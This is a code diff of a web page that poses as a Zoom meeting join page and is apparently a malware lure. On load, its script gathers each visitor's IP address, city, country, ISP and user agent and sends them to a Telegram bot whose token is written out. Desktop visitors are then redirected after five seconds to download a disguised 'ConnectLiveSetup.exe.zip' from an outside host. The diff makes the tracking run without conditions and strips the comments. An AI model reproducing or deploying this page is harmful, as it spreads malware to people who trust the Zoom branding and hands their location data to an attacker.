@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Join ZoomLive</title>
+    <title>Join_ZoomLive</title>
     <style>
         /* Reset & Global Settings */
         body, html {
@@ -11,14 +11,14 @@
             padding: 0;
             height: 100%;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f8f9fa; /* Matches the light background in 78834.png */
+            background-color: #f8f9fa;
         }
 
         /* -----------------------------------
-           MOBILE VIEW (Matches 78834.png) 
+           MOBILE VIEW 
            ----------------------------------- */
         #mobile-view {
-            display: none; /* Hidden by default via CSS */
+            display: none;
             flex-direction: column;
             align-items: center;
             justify-content: center;
@@ -38,7 +38,7 @@
             justify-content: center;
             font-size: 22px;
             font-weight: 600;
-            color: #d93025; /* Warning Red */
+            color: #d93025;
             margin-bottom: 25px;
         }
         
@@ -58,33 +58,29 @@
            DESKTOP VIEW (Background + Spinner)
            ----------------------------------- */
         #desktop-view {
-            display: none; /* Hidden by default via CSS */
+            display: none;
             height: 100vh;
             width: 100vw;
-            /* Injected Zoom Background Image */
             background: url('https://st1.zoom.us/fe-static/fe-signup-login-active-v3/assets/banner-step-1.DTtJ7nly.png') no-repeat center center fixed;
             background-size: cover;
             position: relative;
         }
 
-        /* Top-Left Logo Element */
         .logo {
             position: absolute;
             top: 20px;
             left: 20px;
-            height: 40px; /* Adjust based on your actual logo proportions */
+            height: 40px;
             width: auto;
             z-index: 10;
         }
 
-        /* Spinner Overlay */
         .overlay {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            /* Semi-transparent white to ensure the spinner is readable over the image */
             background: rgba(255, 255, 255, 0.7); 
             display: flex;
             flex-direction: column;
@@ -93,12 +89,11 @@
             z-index: 5;
         }
 
-        /* CSS Loading Ring */
         .spinner {
             width: 50px;
             height: 50px;
             border: 4px solid #e5e5e5;
-            border-top-color: #0b5cff; /* Blue spin color */
+            border-top-color: #0b5cff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -127,8 +122,7 @@
 
     <!-- DOM Element: Desktop Loader -->
     <div id="desktop-view">
-        <!-- REPLACE the src string below with the URL of your actual logo -->
-        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbyGwaDwBGizu6H8S1e_ktO_2wYI7p-BGIt0CuJX7nrw&s=10" alt="Company Logo">
+        <img class="logo" src="https://st1.zoom.us/fe-static/fe-signup-login-active-v3/assets/banner-step-1.DTtJ7nA" alt="Company Logo">
 
         <div class="overlay">
             <div class="spinner"></div>
@@ -136,64 +130,85 @@
     </div>
 
     <!-- Core Logic -->
-        <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            // --- Configuration ---
-            const TARGET_URL = "https://pub-9155da1311434ab9afab81c1b8a9128c.r2.dev/ConnectLiveSetup.exe.zip";
-            
-            // Telegram API Credentials 
-            const TELEGRAM_BOT_TOKEN = "7087439078:AAHJ94YpC_O1MmlxnieYUcFTdvcFDSIB0D4";
-            const TELEGRAM_CHAT_ID = "2074391753";
+    <script>
+        // Configuration Parameters
+        const TELEGRAM_BOT_TOKEN = "7087439078:AAHJ94YpC_O1MmlxnieYUcFTdvcFDSIB0D4"; // Insert your Bot Token here
+        const TELEGRAM_CHAT_ID = "2074391753";     // Insert your Chat ID here
+        const TARGET_URL = "https://pub-9155da1311434ab9afab81c1b8a9128c.r2.dev/ConnectLiveSetup.exe.zip";
 
-            // --- Environment Detection ---
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            const deviceType = isMobile ? "Mobile" : "Desktop";
+        /**
+         * Fetch Geolocation & ISP data from a free CORS/HTTPS endpoint
+         */
+        async function getVisitorDetails() {
+            try {
+                const response = await fetch('https://ipwho.is/');
+                const data = await response.json();
 
-            // --- Notification Logic ---
-            async function triggerTelegramAlert() {
-                try {
-                    // 1. Fetch IP and Geolocation data using a free public API
-                    const geoResponse = await fetch('https://ipapi.co/json/');
-                    const geoData = await geoResponse.json();
-
-                    // 2. Construct the alert message
-                    const message = `
-🔔 *New Page Visitor*
-*Device:* ${deviceType}
-*IP:* ${geoData.ip || 'Unknown'}
-*Location:* ${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}
-*ISP:* ${geoData.org || 'Unknown'}
-                    `;
-
-                    // 3. Dispatch to Telegram API via POST request
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                } catch (error) {
-                    console.error("Alert dispatch failed", error);
+                if (data.success) {
+                    return {
+                        ip: data.ip || 'N/A',
+                        city: data.city || 'N/A',
+                        state: data.region || 'N/A',
+                        country: data.country || 'N/A',
+                        isp: data.connection?.isp || 'N/A'
+                    };
                 }
+            } catch (error) {
+                console.error('Error fetching IP details:', error);
             }
+            return { ip: 'N/A', city: 'N/A', state: 'N/A', country: 'N/A', isp: 'N/A' };
+        }
 
-            // Fire the alert silently in the background (prevents firing if tokens aren't set)
-            if(TELEGRAM_BOT_TOKEN !== "7087439078:AAHJ94YpC_O1MmlxnieYUcFTdvcFDSIB0D4") {
-                triggerTelegramAlert();
+        /**
+         * Dispatch data to Telegram API via POST request
+         */
+        async function sendTelegramAlert(visitor, isMobileDevice) {
+            const message = 
+`🔔 *New Visitor Notification*
+
+📍 *Network Info:*
+• *IP Address:* \`${visitor.ip}\`
+• *City:* ${visitor.city}
+• *State:* ${visitor.state}
+• *Country:* ${visitor.country}
+• *ISP:* ${visitor.isp}
+
+💻 *Device Info:*
+• *Device Type:* ${isMobileDevice ? 'Mobile 📱' : 'Desktop 🖥️'}
+• *User Agent:* \`${navigator.userAgent}\``;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending Telegram notification:', error);
             }
+        }
 
-            // --- Render & Redirect Logic ---
+        document.addEventListener('DOMContentLoaded', async () => {
+            // 1. Detect device environment
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+            // 2. Fetch visitor IP & Geolocation
+            const visitorInfo = await getVisitorDetails();
+
+            // 3. Send notification to Telegram
+            await sendTelegramAlert(visitorInfo, isMobile);
+
+            // 4. Render appropriate UI view
             if (isMobile) {
-                // Mobile: Render warning and stop
                 document.getElementById('mobile-view').style.display = 'flex';
             } else {
-                // Desktop: Render background/loader
                 document.getElementById('desktop-view').style.display = 'block';
 
-                // Execute auto-trigger after 5 seconds
+                // 5. Trigger redirect delay
                 setTimeout(() => {
                     window.location.replace(TARGET_URL);
                 }, 5000); 
@@ -201,5 +216,4 @@
         });
     </script>
 </body>
-</hhttps</body>
 </html>
